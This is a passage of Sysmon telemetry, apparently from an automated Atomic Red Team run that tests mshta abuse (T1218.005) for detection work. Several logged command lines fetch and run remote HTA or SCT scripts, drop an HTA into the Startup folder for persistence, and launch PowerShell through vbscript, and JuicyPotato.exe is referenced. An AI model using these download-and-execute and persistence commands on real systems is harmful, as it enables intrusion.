Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:58 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:58.160
ProcessGuid: {f995aebf-63ee-6942-1007-000000000e00}
ProcessId: 3476
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_phn3xikq.sxa.ps1
CreationUtcTime: 2025-12-17 08:03:58.160
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:58.086
ProcessGuid: {f995aebf-63ee-6942-1007-000000000e00}
ProcessId: 3476
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:57.626
ProcessGuid: {f995aebf-63ed-6942-0e07-000000000e00}
ProcessId: 8408
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_thcyzn50.vbf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:57 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:57.607
ProcessGuid: {f995aebf-63ed-6942-0e07-000000000e00}
ProcessId: 8408
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_thcyzn50.vbf.ps1
CreationUtcTime: 2025-12-17 08:03:57.607
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:57 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:57.532
ProcessGuid: {f995aebf-63ed-6942-0e07-000000000e00}
ProcessId: 8408
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:57.039
ProcessGuid: {f995aebf-63ec-6942-0c07-000000000e00}
ProcessId: 1576
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_l0qy4kry.wr2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:57 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:57.019
ProcessGuid: {f995aebf-63ec-6942-0c07-000000000e00}
ProcessId: 1576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_l0qy4kry.wr2.ps1
CreationUtcTime: 2025-12-17 08:03:57.019
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:56 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:56.946
ProcessGuid: {f995aebf-63ec-6942-0c07-000000000e00}
ProcessId: 1576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:56 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 08:03:56.753
ProcessGuid: {f995aebf-5522-6942-a000-000000000e00}
ProcessId: 5444
Image: C:\Windows\system32\taskhostw.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 8:03:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:56.361
ProcessGuid: {f995aebf-63ec-6942-0907-000000000e00}
ProcessId: 704
Image: C:\Windows\System32\backgroundTaskHost.exe
ImageLoaded: C:\Windows\System32\vaultcli.dll
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Credential Vault Client Library
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: vaultcli.dll
Hashes: SHA256=BFB40CFDD72A3AC28626513170E0FFE1D76D76FA3B3302F4E3FA546F8BBA460B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:51 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 08:03:51.609
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNotiT1218.005.hta
Details: DWORD (0x00000004)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:43 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:41.482
ProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59197
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:41.477
ProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ProcessId: 10072
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:42 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:03:39.913
ProcessGuid: {f995aebf-63db-6942-f406-000000000e00}
ProcessId: 10108
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\mshta.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:41.602
ProcessGuid: {f995aebf-63dd-6942-0007-000000000e00}
ProcessId: 1992
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ParentProcessId: 10072
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:41 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:03:39.915
ProcessGuid: {f995aebf-63db-6942-f406-000000000e00}
ProcessId: 10108
Image: C:\Windows\System32\mshta.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.149
SourceHostname: runnervm8j6r3.o3imerjm4krehdeh0rvc5luiwc.bx.internal.cloudapp.net
SourcePort: 59196
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:03:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:41.219
ProcessGuid: {f995aebf-63dc-6942-fa06-000000000e00}
ProcessId: 7064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yrmamgqa.bli.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:41.202
ProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ProcessId: 10072
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xpchqeos.qgq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:41.200
ProcessGuid: {f995aebf-63dc-6942-fa06-000000000e00}
ProcessId: 7064
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yrmamgqa.bli.ps1
CreationUtcTime: 2025-12-17 08:03:41.200
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:41.175
ProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xpchqeos.qgq.ps1
CreationUtcTime: 2025-12-17 08:03:41.175
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:41.064
ProcessGuid: {f995aebf-63dd-6942-fe06-000000000e00}
ProcessId: 10072
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$var =Invoke-WebRequest \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\""""
$var.content|out-file \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
mshta \""""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta\""""
start-sleep -s 15
stop-process -name \""""calculator\"""" -Force -ErrorAction Ignore
stop-process -name \""""CalculatorApp\"""" -Force -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:40 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:40.448
ProcessGuid: {f995aebf-63dc-6942-f906-000000000e00}
ProcessId: 10048
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta  vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63dc-6942-f706-000000000e00}
ParentProcessId: 4484
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file C:\AtomicRedTeam\atomics\T1218.005\src\powershell.ps1"""":close"")
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:39 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:39.825
ProcessGuid: {f995aebf-63db-6942-f406-000000000e00}
ProcessId: 10108
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=1F1AABE87E5E93A8FFF769BF3614DD559C51C80FC045E11868F3843D9A004D1E
ParentProcessGuid: {f995aebf-63db-6942-f206-000000000e00}
ParentProcessId: 6204
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:37 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:37.156
ProcessGuid: {f995aebf-63d9-6942-ee06-000000000e00}
ProcessId: 2224
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gjuwrwkm.3xy.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:37 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:37.138
ProcessGuid: {f995aebf-63d9-6942-ee06-000000000e00}
ProcessId: 2224
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gjuwrwkm.3xy.ps1
CreationUtcTime: 2025-12-17 08:03:37.138
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:37 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:37.068
ProcessGuid: {f995aebf-63d9-6942-ee06-000000000e00}
ProcessId: 2224
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {get-ciminstance Win32_Process | where-object { $_.Path -eq \""""$env:windir\system32\notepad.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null
get-ciminstance Win32_Process | where-object { $_.Path -eq \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\JuicyPotato.exe\"""" } | invoke-cimmethod -methodname \""""terminate\"""" | out-null}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:36 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:36.821
ProcessGuid: {f995aebf-63d8-6942-ed06-000000000e00}
ProcessId: 3752
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:36.731
ProcessGuid: {f995aebf-63d8-6942-eb06-000000000e00}
ProcessId: 9208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vwbgdlng.vzw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:36 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:36.715
ProcessGuid: {f995aebf-63d8-6942-eb06-000000000e00}
ProcessId: 9208
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_vwbgdlng.vzw.ps1
CreationUtcTime: 2025-12-17 08:03:36.715
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:36 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:36.356
ProcessGuid: {f995aebf-63d8-6942-e906-000000000e00}
ProcessId: 956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ddjfdvtc.vwj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:36 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:36.338
ProcessGuid: {f995aebf-63d8-6942-e906-000000000e00}
ProcessId: 956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ddjfdvtc.vwj.ps1
CreationUtcTime: 2025-12-17 08:03:36.338
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:35.989
ProcessGuid: {f995aebf-63d7-6942-e706-000000000e00}
ProcessId: 8944
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u2em3tj2.gzs.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:35 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:35.971
ProcessGuid: {f995aebf-63d7-6942-e706-000000000e00}
ProcessId: 8944
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u2em3tj2.gzs.ps1
CreationUtcTime: 2025-12-17 08:03:35.971
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:35.614
ProcessGuid: {f995aebf-63d7-6942-e506-000000000e00}
ProcessId: 7728
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lm1w3kbj.krp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
